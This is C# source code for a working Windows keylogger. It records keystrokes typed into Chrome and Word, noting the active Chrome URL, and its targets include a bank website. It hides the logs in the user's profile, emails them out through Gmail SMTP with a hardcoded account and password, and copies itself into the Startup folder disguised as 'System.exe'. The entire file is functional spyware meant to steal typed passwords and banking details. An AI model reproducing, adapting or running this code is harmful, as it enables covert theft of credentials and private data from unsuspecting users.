using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.Timers;
using System.Diagnostics;
using System.IO;
using System.Windows.Automation;
using System.Text.RegularExpressions;
using System.Windows.Input;

namespace ConsoleApplication29
{
    class Program
    {
        static string[] urls = { "www.bankhapoalim.co.il", "www.google.co.il" };
        static int lengthchrome;
        static int lengthword;
        static FileInfo chromefile;
        static FileInfo wordfile;
        static FileInfo emailchromefile;
        static FileInfo emailwordfile;
        static string chromeloc = @"C:\Users\" + System.Environment.UserName + @"\chrome.txt";
        static string wordloc = @"C:\Users\" + System.Environment.UserName + @"\word.txt";
        static string emailchromeloc = @"C:\Users\" + System.Environment.UserName + @"\chromeemail.txt";
        static string emailwordloc = @"C:\Users\" + System.Environment.UserName + @"\wordemail.txt";
        static string currentURL = "";
        static string lastURL = "x";
        static string lang = "";
        static Encoding encoding = Encoding.GetEncoding("ascii");
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        static void StartLogging()
        {
            chromefile = new FileInfo(@"C:\Users\" + System.Environment.UserName + @"\chrome.txt");
            wordfile = new FileInfo(@"C:\Users\" + System.Environment.UserName + @"\word.txt");
            lengthchrome = (int)chromefile.Length;
            lengthword = (int)chromefile.Length;

            while (true)
            {
                Thread.Sleep(10);
                Process[] pchrome = Process.GetProcessesByName("chrome");
                Process[] pword = Process.GetProcessesByName("WINWORD");
                InputLanguage culture = InputLanguage.CurrentInputLanguage;
                lang = culture.Culture.EnglishName.ToString();
                if (ApplicationIsActivated2("chrome") || ApplicationIsActivated2("WINWORD"))
                {
                    for (int i = 4; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {
                            if (ApplicationIsActivated2("chrome"))
                            {
                                currentURL = ShortURL(GetChormeURL("chrome"));
                                File.SetAttributes(chromeloc, FileAttributes.Normal);
                                WriteInFile("chrome", i);
                                File.SetAttributes(emailchromeloc, FileAttributes.Hidden);

                                chromefile = new FileInfo(@"C:\Users\" + System.Environment.UserName + @"\chrome.txt");
                                lengthchrome = (int)chromefile.Length;
                                if (lengthchrome >= 75)
                                {
                                    File.SetAttributes(emailchromeloc, FileAttributes.Normal);
                                    File.SetAttributes(chromeloc, FileAttributes.Normal);

                                    string chrometext = "";
                                    using (StreamReader file = new StreamReader(@"C:\Users\" + System.Environment.UserName + @"\chrome.txt"))
                                    {

                                        chrometext = file.ReadToEnd();
                                    }
                                    using (StreamWriter file2 = new StreamWriter(@"C:\Users\" + System.Environment.UserName + @"\chromeemail.txt", true))
                                    {
                                        file2.Write(chrometext);

                                    }
                                    Email_send("chrome");
                                    File.WriteAllText(chromeloc, string.Empty);
                                    File.WriteAllText(emailchromeloc, string.Empty);
                                    File.SetAttributes(chromeloc, FileAttributes.Hidden);
                                    File.SetAttributes(emailchromeloc, FileAttributes.Hidden);
                                }
                            }
                            if (ApplicationIsActivated2("WINWORD"))
                            {
                                File.SetAttributes(wordloc, FileAttributes.Normal);
                                WriteInFile("word", i);
                                File.SetAttributes(wordloc, FileAttributes.Hidden);
                                wordfile = new FileInfo(@"C:\Users\" + System.Environment.UserName + @"\word.txt");
                                lengthword = (int)wordfile.Length;
                                if (lengthword >= 25)
                                {
                                    File.SetAttributes(emailwordloc, FileAttributes.Normal);
                                    File.SetAttributes(wordloc, FileAttributes.Normal);
                                    string wordtext = "";
                                    using (StreamReader file = new StreamReader(@"C:\Users\" + System.Environment.UserName + @"\word.txt"))
                                    {

                                        wordtext = file.ReadToEnd();
                                    }
                                    using (StreamWriter file2 = new StreamWriter(@"C:\Users\" + System.Environment.UserName + @"\wordemail.txt", true))
                                    {
                                        file2.Write(wordtext);

                                    }
                                    Email_send("word");
                                    File.WriteAllText(wordloc, string.Empty);
                                    File.WriteAllText(emailwordloc, string.Empty);
                                    File.SetAttributes(emailwordloc, FileAttributes.Hidden);
                                    File.SetAttributes(wordloc, FileAttributes.Hidden);
                                }
                            }
                        }
                    }
                }
            }
        }
        public static void WriteInFile(string file1, int i)
        {

            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\" + System.Environment.UserName + @"\" + file1 + ".txt", true))
            {
                if (currentURL != lastURL)
                {
                    file.WriteLine("");
                    lastURL = currentURL;
                    file.Write(ShortURL(currentURL) + " ");
                }


                if (i >= 96 && i <= 105) file.Write(i - 96);
                else if (i == 18 || i == 164 || i == 165 || i == 16 || i == 160 || i == 17 || i == 163 || i == 161 || i == 162) { file.Write(""); }
                else if (i == 220) file.Write(@"\");
                else if (Control.ModifierKeys == Keys.Shift)
                {

                    file.Write("");

                    if (i == 48) file.Write(")");

                    if (i == 49) file.Write("!");

                    if (i == 50) file.Write("@");

                    if (i == 51) file.Write("#");

                    if (i == 52) file.Write("$");

                    if (i == 53) file.Write("%");

                    if (i == 54) file.Write("^");

                    if (i == 55) file.Write("&");

                    if (i == 56) file.Write("*");

                    if (i == 57) file.Write("(");

                    if (i == 186) file.Write(":");

                    if (i == 187) file.Write("+");

                    if (i == 189) file.Write("_");

                    if (i == 191) file.Write("?");

                    if (i == 192) file.Write("~");

                    if (i == 219) file.Write("{");

                    if (i == 220) file.Write("|");

                    if (i == 221) file.Write("}");

                }

                else if (Control.ModifierKeys == Keys.Control || Control.ModifierKeys == Keys.Menu) file.Write("");


                else if (i == 27 || (i == 144) || (i >= 112 && i <= 127) || (i >= 33 && i <= 40) || (i >= 45 && i <= 47)) file.Write("");


                else if (i >= 48 && i <= 57) file.Write(i - 48);


                else if (i == 32) file.Write(" ");


                else if (i == 13) file.WriteLine("");


                else if (i == 111) file.Write("/");


                else if (i == 109) file.Write("-");


                else if (i == 107) file.Write("+");


                else if (i == 110) file.Write(".");


                else if (i == 106) file.Write("*");


                else if (i == 186) file.Write(";");


                else if (i == 187) file.Write("=");


                else if (i == 189) file.Write("-");


                else if (i == 191) file.Write("/");


                else if (i == 192) file.Write("`");


                else if (i == 219) file.Write("[");


                else if (i == 221) file.Write("]");


                else if (i == 222) file.Write("'");
                else if (((Keys)i).ToString() == "MButton") file.Write("");

                else if (lang[0] == 'E')
                {
                    //     byte[] asciiBytes = encoding.GetBytes(((Keys)i).ToString());

                    //     MessageBox.Show(asciiBytes[0].ToString());
                    file.Write((Keys)i);
                }
                else
                {

                    string x = ((Keys)i).ToString();
                    char y = x[0];
                    file.Write(ConvertToHebrew(y));
                }

            }
        }
        public static string ConvertToHebrew(char c)
        {

            if (c == ',') return "ת";
            if (c == 'A') return "ש";
            if (c == 'B') return "נ";
            if (c == 'C') return "ב";
            if (c == 'D') return "ג";
            if (c == 'E') return "ק";
            if (c == 'F') return "כ";
            if (c == 'G') return "ע";
            if (c == 'H') return "י";
            if (c == 'I') return "ן";
            if (c == 'J') return "ח";
            if (c == 'K') return "ל";
            if (c == 'L') return "ך";
            if (c == 'M') return "צ";
            if (c == 'N') return "מ";
            if (c == 'O') return "ם";
            if (c == 'P') return "פ";
            if (c == 'Q') return "/";
            if (c == 'R') return "ר";
            if (c == 'S') return "ד";
            if (c == 'T') return "א";
            if (c == 'U') return "ו";
            if (c == 'V') return "ה";
            if (c == 'W') return "'";
            if (c == 'X') return "ס";
            if (c == 'Y') return "ט";
            if (c == 'Z') return "ז";
            return null;
        }

        public static bool ApplicationIsActivated2(string name)
        {
            var activatedHandle = GetForegroundWindow();
            if (activatedHandle == IntPtr.Zero)
            {
                return false;       // No window is currently activated
            }
            Process[] localByName = Process.GetProcessesByName(name);
            var procId = Process.GetCurrentProcess().Id;
            int activeProcId;
            GetWindowThreadProcessId(activatedHandle, out activeProcId);
            foreach (Process theprocess in localByName)
            {

                if (theprocess.Id == activeProcId)
                {
                    return true;
                }

            }
            return false;
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
        public static void Email_send(string file)
        {

            using (MailMessage mail = new MailMessage())
            {
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("ovedimperia@gmail.com");
                mail.To.Add("ovedimperia@gmail.com");
                int day = DateTime.Now.Day;
                int month = DateTime.Now.Month;
                int year = DateTime.Now.Year;
                mail.Subject = System.Environment.UserName + "-" + file + " " + day + "/" + month + "/" + year;
                mail.Body = "cyber keylogger";

                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(@"C:\Users\" + System.Environment.UserName + @"\" + file + "email.txt");
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("ovedimperia@gmail.com", "ovedimperia1");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
        }

        static void AddToStartup()
        {
            string path = @"C:\Users\" + System.Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
            string filecurrent = System.IO.Path.GetDirectoryName(Application.ExecutablePath);

            if (!File.Exists(path + @"\System.exe"))
            {
                File.Copy(filecurrent + @"\WindowsFormsApplication1.exe", path + @"\System.exe"); //Copy
            }
        }



        static void CreateTxtFiles()
        {
            if (!(File.Exists(chromeloc)))
                File.Create(chromeloc);
            File.SetAttributes(chromeloc, FileAttributes.Hidden);
            if (!(File.Exists(wordloc)))
                File.Create(wordloc);
            File.SetAttributes(wordloc, FileAttributes.Hidden);
            if (!(File.Exists(emailchromeloc)))
                File.Create(emailchromeloc);
            File.SetAttributes(emailchromeloc, FileAttributes.Hidden);
            if (!(File.Exists(emailwordloc)))
                File.Create(emailwordloc);
            File.SetAttributes(emailwordloc, FileAttributes.Hidden);
        }
        public static string ShortURL(string ret)
        {
            if (ret.StartsWith("https://"))
            {
                string temp = ret;
                ret = "";
                for (int i = 8; i < temp.Length; i++)
                    ret += temp[i];
            }
            int k = -1;
            bool flag = false;
            for (int i = 0; i < ret.Length && k == -1; i++)
            {
                if (ret[i] == '.')
                    flag = true;
                if (flag && ret[i] == '/')
                    k = i;
            }
            if (k != -1)
            {
                string ret1 = "";
                for (int i = 0; i < k; i++)
                    ret1 += ret[i];
                return ret1;
            }
            return ret;
        }
        public static string GetChormeURL(string ProcessName)
        {
            string ret = "";
            Process[] procs = Process.GetProcessesByName(ProcessName);
            foreach (Process proc in procs)
            {
                // the chrome process must have a window
                if (proc.MainWindowHandle == IntPtr.Zero)
                {
                    continue;
                }
                //AutomationElement elm = AutomationElement.RootElement.FindFirst(TreeScope.Children,
                //         new PropertyCondition(AutomationElement.ClassNameProperty, "Chrome_WidgetWin_1"));
                // find the automation element
                AutomationElement elm = AutomationElement.FromHandle(proc.MainWindowHandle);


                // manually walk through the tree, searching using TreeScope.Descendants is too slow (even if it's more reliable)
                AutomationElement elmUrlBar = null;
                try
                {
                    // walking path found using inspect.exe (Windows SDK) for Chrome 43.0.2357.81 m (currently the latest stable)
                    // Inspect.exe path - C://Program files (X86)/Windows Kits/10/bin/x64
                    var elm1 = elm.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.NameProperty, "Google Chrome"));
                    if (elm1 == null) { continue; } // not the right chrome.exe
                    var elm2 = TreeWalker.RawViewWalker.GetLastChild(elm1); // I don't know a Condition for this for finding
                    var elm3 = elm2.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.NameProperty, ""));
                    var elm4 = TreeWalker.RawViewWalker.GetNextSibling(elm3); // I don't know a Condition for this for finding
                    var elm5 = elm4.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.ToolBar));
                    var elm6 = elm5.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.NameProperty, ""));
                    elmUrlBar = elm6.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit));
                }
                catch
                {
                    // Chrome has probably changed something, and above walking needs to be modified. :(
                    // put an assertion here or something to make sure you don't miss it
                    continue;
                }

                // make sure it's valid
                if (elmUrlBar == null)
                {
                    // it's not..
                    continue;
                }

                // elmUrlBar is now the URL bar element. we have to make sure that it's out of keyboard focus if we want to get a valid URL
                if ((bool)elmUrlBar.GetCurrentPropertyValue(AutomationElement.HasKeyboardFocusProperty))
                {
                    continue;
                }

                // there might not be a valid pattern to use, so we have to make sure we have one
                AutomationPattern[] patterns = elmUrlBar.GetSupportedPatterns();
                if (patterns.Length == 1)
                {
                    try
                    {
                        ret = ((ValuePattern)elmUrlBar.GetCurrentPattern(patterns[0])).Current.Value;
                        return ret;
                    }
                    catch { }
                    if (ret != "")
                    {
                        // must match a domain name (and possibly "https://" in front)
                        if (Regex.IsMatch(ret, @"^(https:\/\/)?[a-zA-Z0-9\-\.]+(\.[a-zA-Z]{2,4}).*$"))
                        {
                            // prepend http:// to the url, because Chrome hides it if it's not SSL

                            return ret;

                        }
                    }
                    continue;
                }
            }
            return ret;
        }
        static void Main(string[] args)
        {
            AddToStartup();
            CreateTxtFiles();
            StartLogging();
        }
    }
}
